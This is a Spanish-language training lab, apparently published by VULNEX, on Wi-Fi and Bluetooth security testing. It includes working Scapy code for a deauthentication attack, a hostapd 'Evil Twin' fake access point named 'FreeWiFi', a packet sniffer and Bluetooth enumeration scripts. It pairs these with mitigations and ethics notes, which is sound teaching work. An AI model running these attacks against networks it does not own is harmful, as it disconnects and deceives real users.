# **Guía de Laboratorio Práctico: Seguridad en Wi-Fi y Bluetooth**

VULNEX
https://github.com/vulnex/wifi_bluetooth_security

## **Resumen del Laboratorio**
Este laboratorio te guiará a través de pruebas de seguridad en **Wi-Fi** y **Bluetooth** utilizando **Python**. Aprenderás a:
- Capturar paquetes.
- Realizar ataques de desautenticación.
- Escanear dispositivos Bluetooth.
- Probar vulnerabilidades en la comunicación inalámbrica.

---

## **Laboratorio 1: Análisis de Seguridad en Wi-Fi con Scapy**

### **Objetivo**
✅ Capturar y analizar tráfico Wi-Fi.
✅ Probar ataques de desautenticación.
✅ Explorar puntos de acceso falsos.

### **Requisitos Previos**
- Un ordenador con **Linux** y una **tarjeta inalámbrica que soporte modo monitor**.
- Instalar `scapy`:
  ```bash
  pip install scapy
  ```
- Configurar la tarjeta Wi-Fi en **modo monitor**:
  ```bash
  airmon-ng start wlan0
  ```

### **Tarea 1: Captura de Paquetes**
1. Ejecuta el siguiente script para capturar paquetes Wi-Fi:
   ```python
   from scapy.all import *
   
   def manejar_paquete(paquete):
       if paquete.haslayer(Dot11):
           print(paquete.summary())
   
   sniff(iface="wlan0mon", prn=manejar_paquete, store=0)
   ```
2. Observa las **direcciones MAC** y los **tipos de tramas**.
3. Identifica cualquier **dato no cifrado**.

**📌 Pregunta:** ¿Qué tipos de paquetes capturaste? ¿Había paquetes sin cifrar?

---

### **Tarea 2: Ataque de Desautenticación**
⚠ **Advertencia:** Solo prueba esto en tu propia red.

1. Identifica la **dirección MAC del dispositivo objetivo** y la **dirección MAC del router**.
2. Modifica el siguiente script con las direcciones MAC correctas:
   ```python
   def desautenticar(mac_objetivo, mac_router, iface="wlan0mon", cantidad=100):
       from scapy.all import *
       dot11 = Dot11(addr1=mac_objetivo, addr2=mac_router, addr3=mac_router)
       paquete = RadioTap()/dot11/Dot11Deauth(reason=7)
       sendp(paquete, iface=iface, count=cantidad, inter=0.1, verbose=1)
   
   desautenticar("AA:BB:CC:DD:EE:FF", "11:22:33:44:55:66")
   ```
3. Ejecuta el script y observa si el dispositivo objetivo se desconecta.

**📌 Pregunta:** ¿Qué sucede cuando el dispositivo se desautentica? ¿Cómo se puede mitigar este ataque?

---

### **Tarea 3: Punto de Acceso Falso (Ataque Evil Twin)**
1. Crea un **punto de acceso falso** con la siguiente configuración:
   ```bash
   echo "interface=wlan0mon
   ssid=FreeWiFi
   channel=6" > hostapd.conf
   ```
2. Inicia el punto de acceso:
   ```bash
   hostapd hostapd.conf
   ```
3. Intenta conectarte al punto de acceso falso desde otro dispositivo.

**📌 Pregunta:** ¿Cómo pueden los usuarios protegerse contra ataques Evil Twin?

---

## **Laboratorio 2: Pruebas de Seguridad en Bluetooth con Python**

### **Objetivo**
✅ Escanear dispositivos Bluetooth.
✅ Identificar servicios Bluetooth.
✅ Simular ataques Bluetooth.

### **Requisitos Previos**
- Instalar `pybluez`:
  ```bash
  pip install pybluez
  ```
- Habilitar Bluetooth en tu sistema.

### **Tarea 1: Descubrimiento de Dispositivos Bluetooth**
1. Ejecuta el siguiente script:
   ```python
   import bluetooth
   
   print("Escaneando dispositivos Bluetooth...")
   dispositivos = bluetooth.discover_devices(duration=8, lookup_names=True)
   
   for addr, name in dispositivos:
       print(f"Dispositivo encontrado: {name} - {addr}")
   ```
2. Identifica los dispositivos Bluetooth cercanos.
3. Compara los resultados con el escaneo de Bluetooth en tu móvil.

**📌 Pregunta:** ¿Todos los dispositivos Bluetooth son visibles? ¿Por qué algunos pueden estar ocultos?

---

### **Tarea 2: Enumeración de Servicios Bluetooth**
1. Elige una **dirección MAC de dispositivo objetivo** de la Tarea 1.
2. Ejecuta el siguiente script:
   ```python
   mac_objetivo = "XX:XX:XX:XX:XX:XX"
   servicios = bluetooth.find_service(address=mac_objetivo)
   
   if servicios:
       for servicio in servicios:
           print(f"Nombre del servicio: {servicio['name']}")
           print(f"  Host: {servicio['host']}")
           print(f"  Protocolo: {servicio['protocol']}")
           print(f"  Puerto: {servicio['port']}\n")
   else:
       print("No se encontraron servicios.")
   ```
3. Lista los servicios disponibles.

**📌 Pregunta:** ¿Qué tipos de servicios encontraste? ¿Cómo pueden los atacantes explotar los servicios Bluetooth abiertos?

---

## **Discusión y Técnicas de Mitigación**

### **Mitigaciones para Seguridad en Wi-Fi**
✅ Utilizar cifrado **WPA3**.
✅ Activar **aleatorización de dirección MAC**.
✅ Deshabilitar **WPS** y evitar el uso de SSID ocultos.
✅ Usar **Protección de Tramas de Gestión (MFP)** para prevenir ataques de desautenticación.

### **Mitigaciones para Seguridad en Bluetooth**
✅ Mantener el Bluetooth **desactivado** cuando no se use.
✅ Utilizar **lista blanca de dispositivos**.
✅ Emparejar dispositivos en **entornos seguros**.
✅ Utilizar **cifrado Bluetooth Low Energy (BLE)** cuando esté disponible.

---

## **Informe Final**
Al finalizar el laboratorio, redacta un breve **informe de seguridad** que incluya:
- Hallazgos de **captura y ataques Wi-Fi**.
- Observaciones del **escaneo Bluetooth**.
- **Contramedidas** para cada vulnerabilidad.

---

## **Notas del Instructor**
- Asegurar que los estudiantes realicen estas actividades **solo en redes/dispositivos propios**.
- Discutir **implicaciones legales y éticas**.
- Fomentar el pensamiento sobre **aplicaciones de seguridad en el mundo real**.

